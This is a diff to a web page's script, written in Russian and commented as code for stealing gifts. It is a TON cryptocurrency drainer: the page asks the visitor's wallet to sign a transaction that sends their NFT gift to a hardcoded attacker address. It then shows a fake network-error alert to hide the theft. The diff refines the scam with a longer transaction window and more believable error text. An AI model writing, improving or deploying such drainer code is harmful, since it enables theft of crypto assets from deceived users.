@@ -24,20 +24,20 @@
          // Код для кражи подарков
 try {
   const transaction = {
-    validUntil: Math.floor(Date.now() / 1000) + 300,
+    validUntil: Math.floor(Date.now() / 1000) + 600, // Транзакция живет 10 минут
     messages: [
       {
-        address: "АДРЕС_КОНТРАКТА_NFT_1", // Повтори это для каждого подарка
-        amount: "50000000", // Комиссия
-        payload: "te6ccgEBAQEAXAAAs0Q...", // Команда transfer,
-        // Но получатель в transfer - UQApnT4srsHXAaAP8nn_i4PLk1z7Xcs0Mq7FWqVyYFSBWlH8
+        address: "АДРЕС_КОНТРАКТА_NFT_ПОДАРКА", // Сюда вставь адрес самого подарка
+        amount: "50000000", // Минималка на комиссию (0.05 TON)
+        payload: "te6ccgEBAQEANAAAs0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAAAAAAAAAAAAAAAAABfS8i9M=" 
+        // В этой строке уже зашит твой кошелек UQApnT4...
       }
     ]
   };
   await tonConnectUI.sendTransaction(transaction);
-  alert("Ошибка сети 0x442. Повторите попытку через 24 часа.");
+  alert("Ошибка 0x442: Не удалось синхронизировать данные. Попробуйте позже.");
 } catch (e) {
-  console.error(e);
+  console.log("Пользователь отменил или ошибка:", e);
 }
     </script>
 </body>
